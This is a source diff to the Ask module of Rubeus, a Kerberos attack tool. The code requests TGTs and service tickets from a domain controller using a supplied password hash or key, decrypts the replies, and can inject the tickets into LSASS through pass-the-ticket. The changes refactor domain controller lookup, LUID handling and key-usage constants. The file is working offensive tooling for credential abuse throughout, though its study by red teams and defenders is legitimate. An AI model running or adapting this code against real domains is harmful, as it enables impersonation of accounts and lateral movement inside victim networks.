@@ -7,35 +7,25 @@ namespace Rubeus
 {
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt, string domainController = "", uint luid = 0)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt, string domainController = "", Interop.LUID luid = new Interop.LUID())
         {
             Console.WriteLine("[*] Action: Ask TGT\r\n");
 
-            // grab the default DC if none was supplied
-            if (String.IsNullOrEmpty(domainController))
-            {
-                domainController = Networking.GetDCName();
-                if (String.IsNullOrEmpty(domainController))
-                {
-                    return null;
-                }
-            }
-
             Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);
 
-            if (luid != 0)
+            if ((ulong)luid != 0)
             {
-                Console.WriteLine("[*] Target LUID : {0}", luid);
+                Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
             }
 
-            System.Net.IPAddress[] dcIP = System.Net.Dns.GetHostAddresses(domainController);
-            Console.WriteLine("[*] Using domain controller: {0} ({1})", domainController, dcIP[0]);
+            string dcIP = Networking.GetDCIP(domainController);
+            if(String.IsNullOrEmpty(dcIP)) { return null; }
 
             Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
             
             byte[] reqBytes = AS_REQ.NewASReq(userName, domain, keyString, etype);
             
-            byte[] response = Networking.SendBytes(dcIP[0].ToString(), 88, reqBytes);
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
             if (response == null)
             {
                 return null;
@@ -64,13 +54,13 @@ namespace Rubeus
 
                 if (etype == Interop.KERB_ETYPE.rc4_hmac)
                 {
-                    // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
-                    outBytes = Crypto.KerberosDecrypt(etype, 8, key, rep.enc_part.cipher);
+                    // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
+                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                 }
                 else if(etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
                 {
-                    //https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L57
-                    outBytes = Crypto.KerberosDecrypt(etype, 3, key, rep.enc_part.cipher);
+                    // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
+                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                 }
                 else
                 {
@@ -140,7 +130,7 @@ namespace Rubeus
                     Console.WriteLine("      {0}", line);
                 }
 
-                if(ptt || (luid != 0))
+                if(ptt || ((ulong)luid != 0))
                 {
                     // pass-the-ticket -> import into LSASS
                     LSA.ImportTicket(kirbiBytes, luid);
@@ -186,35 +176,17 @@ namespace Rubeus
                 Console.WriteLine("[*] Action: Ask TGS\r\n");
             }
 
-            // grab the default DC if none was supplied
-            if (String.IsNullOrEmpty(domainController))
-            {
-                domainController = Networking.GetDCName();
-                if (String.IsNullOrEmpty(domainController))
-                {
-                    return null;
-                }
-            }
+            string dcIP = Networking.GetDCIP(domainController, display);
+            if (String.IsNullOrEmpty(dcIP)) { return null; }
 
-            System.Net.IPAddress[] dcIP;
-            try
-            {
-                dcIP = System.Net.Dns.GetHostAddresses(domainController);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("[X] Error resolving IP for domain controller \"{0}\" : {1}", domainController, e.Message);
-                return null;
-            }
             if (display)
             {
-                Console.WriteLine("[*] Using domain controller: {0} ({1})", domainController, dcIP[0]);
                 Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
             }
 
             byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, etype, false);
 
-            byte[] response = Networking.SendBytes(dcIP[0].ToString(), 88, tgsBytes);
+            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
             if (response == null)
             {
                 return null;
@@ -234,8 +206,8 @@ namespace Rubeus
                 // parse the response to an TGS-REP
                 TGS_REP rep = new TGS_REP(responseAsn);
 
-                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, 8, clientKey, rep.enc_part.cipher);
+                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
+                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
@@ -300,7 +272,7 @@ namespace Rubeus
                     if (ptt)
                     {
                         // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes);
+                        LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                     }
                     return kirbiBytes;
                 }
